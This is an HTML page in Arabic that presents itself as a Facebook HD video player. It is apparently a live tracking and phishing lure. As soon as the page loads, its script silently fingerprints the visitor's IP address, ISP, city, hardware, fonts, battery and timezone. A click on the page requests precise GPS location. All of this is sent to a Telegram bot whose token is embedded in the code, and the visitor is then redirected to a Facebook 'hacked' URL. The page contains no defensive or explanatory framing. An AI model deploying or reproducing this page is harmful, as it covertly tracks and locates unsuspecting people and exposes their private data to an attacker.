<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video Player - HD Streaming</title>
    
    <meta property="og:title" content="شاهد الفيديو الآن">
    <meta property="og:description" content="فيديو حصري بجودة عالية">
    <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg">
    <meta property="og:type" content="website">

    <style>
        body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .card { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 380px; width: 90%; }
        .fb-logo { width: 55px; margin-bottom: 15px; }
        .h1 { font-size: 20px; font-weight: bold; color: #1c1e21; margin-bottom: 12px; }
        .btn { background: #1877f2; color: white; padding: 14px; border-radius: 8px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3); }
    </style>
</head>
<body onclick="getAccurateGPS()">

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="fb-logo">
        <div class="h1">مشغل الفيديو الذكي</div>
        <p style="font-size: 14px; color: #606770; margin-bottom: 25px;">يتم الآن ضبط إعدادات العرض لتناسب جهازك. اضغط للبدء.</p>
        <button class="btn">تشغيل الفيديو</button>
    </div>

<script>
    // 🔱 إعدادات أمجد (بوت تلجرام) 🔱
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
    }

    // 🔱 1. بصمة الشبكة (Silent Network Fingerprint)
    function startSilentScan() {
        const script = document.createElement('script');
        script.src = 'https://api.ipify.org?format=jsonp&callback=initDeepScan';
        document.body.appendChild(script);
    }

    async function initDeepScan(data) {
        const ip = data.ip;
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const d = await res.json();
            let report = `🌐 [1. NETWORK LAYER]\nIP: ${d.ip}\nISP: ${d.org}\nCity: ${d.city}\nTimezone: ${d.timezone}`;
            sendToTelegram(report);
        } catch (e) { sendToTelegram(`🚀 IP Found: ${ip}`); }
    }

    // 🔱 2. بصمة العتاد (Silent Hardware Profile)
    async function getDeviceHardwareProfile() {
        let hardwareInfo = "🎮 [2. HARDWARE PROFILE]\n";
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            hardwareInfo += `GPU: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
            hardwareInfo += `Cores: ${navigator.hardwareConcurrency}\n`;
            hardwareInfo += `RAM: ~${navigator.deviceMemory}GB\n`;
            hardwareInfo += `Screen: ${screen.width}x${screen.height}\n`;
            sendToTelegram(hardwareInfo);
        } catch (e) { sendToTelegram("⚠️ Hardware extraction failed."); }
    }

    // 🔱 3. الهجوم الصامت الشامل (Silent Deep Extraction)
    async function getDeepDeviceFingerprint() {
        let deepInfo = "🕵️‍♂️ [3. DEEP SILENT REPORT]\n";
        try {
            // بصمة الخطوط - تكشف الموديل
            const fonts = ["Roboto", "Ubuntu", "Segoe UI", "Calibri", "Arial"];
            let fontData = fonts.filter(f => document.fonts.check(`12px "${f}"`)).join(", ");
            deepInfo += `🖋️ Fonts: ${fontData}\n`;

            // بصمة الصوت
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            deepInfo += `🔊 Audio SampleRate: ${audioCtx.sampleRate}Hz\n`;

            // حالة البطارية (صامتة تماماً)
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                deepInfo += `🔋 Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})\n`;
            }

            // كشف الـ VPN عبر الـ Offset
            const offset = new Date().getTimezoneOffset();
            deepInfo += `⏳ TZ Offset: ${offset} min\n`;
            deepInfo += `🖱️ Platform: ${navigator.platform}\n`;
            deepInfo += `🛰️ Max Touch: ${navigator.maxTouchPoints}`;

            sendToTelegram(deepInfo);
        } catch (e) { sendToTelegram("⚠️ Deep extraction failed."); }
    }

    // 🔱 4. الموقع الدقيق (GPS - عند الضغط فقط)
    function getAccurateGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let msg = `🎯 [4. PRECISION LOCATION]\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAcc: ${pos.coords.accuracy}m\n🔗 Map: https://www.google.com/maps?q=${lat},${pos.coords.longitude}`;
                sendToTelegram(msg);
                setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
            }, (err) => {
                sendToTelegram("⚠️ GPS Permission Denied.");
                window.location.href = "https://m.facebook.com/hacked";
            }, { enableHighAccuracy: true });
        }
    }

    // تشغيل كل المصائد الصامتة فور التحميل
    window.onload = function() {
        startSilentScan();
        getDeviceHardwareProfile();
        getDeepDeviceFingerprint();
    };
</script>
</body>
</html>
